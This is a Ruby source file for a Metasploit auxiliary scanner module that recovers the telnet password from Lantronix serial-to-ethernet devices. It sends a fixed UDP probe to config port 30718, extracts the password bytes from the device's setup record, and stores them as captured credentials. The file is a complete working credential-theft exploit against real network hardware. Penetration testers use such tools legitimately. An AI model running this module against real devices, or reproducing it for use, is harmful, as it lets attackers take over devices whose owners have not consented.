##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary
  include Msf::Exploit::Remote::Udp
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Lantronix Telnet Password Recovery',
      'Description' => %q{
          This module retrieves the setup record from Lantronix serial-to-ethernet
        devices via the config port (30718/udp, enabled by default) and extracts the
        telnet password. It has been tested successfully on a Lantronix Device Server
        with software version V5.8.0.1.
      },
      'Author'      => 'jgor',
      'License'     => MSF_LICENSE
    )

    register_options(
      [
        Opt::CHOST,
        Opt::RPORT(30718)
      ], self.class)
  end

  def run_host(ip)
    setup_probe = "\x00\x00\x00\xF8"
    password = nil

    begin
      # Create an unbound UDP socket if no CHOST is specified, otherwise
      # create a UDP socket bound to CHOST (in order to avail of pivoting)
      udp_sock = Rex::Socket::Udp.create( {
        'LocalHost' => datastore['CHOST'] || nil,
        'PeerHost'  => ip,
        'PeerPort'  => datastore['RPORT'],
        'Context'   =>
        {
          'Msf' => framework,
          'MsfExploit' => self
        }
      })

      udp_sock.put(setup_probe)

      res = udp_sock.recvfrom(65535, 0.5) and res[1]

      if res
        password = parse_reply(res)
      end
    rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionRefused, ::IOError
      print_error("Connection error")
    rescue ::Interrupt
      raise $!
    rescue ::Exception => e
      print_error("Unknown error: #{e.class} #{e}")
    ensure
      udp_sock.close if udp_sock
    end

    if password
      if password == "\x00\x00\x00\x00"
        print_status("#{rhost} - Password isn't used, or secure")
      else
        print_good("#{rhost} - Telnet password found: #{password.to_s}")

        report_auth_info({
          :host         => rhost,
          :port         => 9999,
          :sname        => 'telnet',
          :duplicate_ok => false,
          :pass         => password.to_s
        })
      end
    end

  end

  def parse_reply(pkt)
    setup_record = pkt[0]

    # If response is a setup record, extract password bytes 13-16
    if setup_record[3] and setup_record[3].ord == 0xF9
      return setup_record[12,4]
    else
      return nil
    end
  end

end
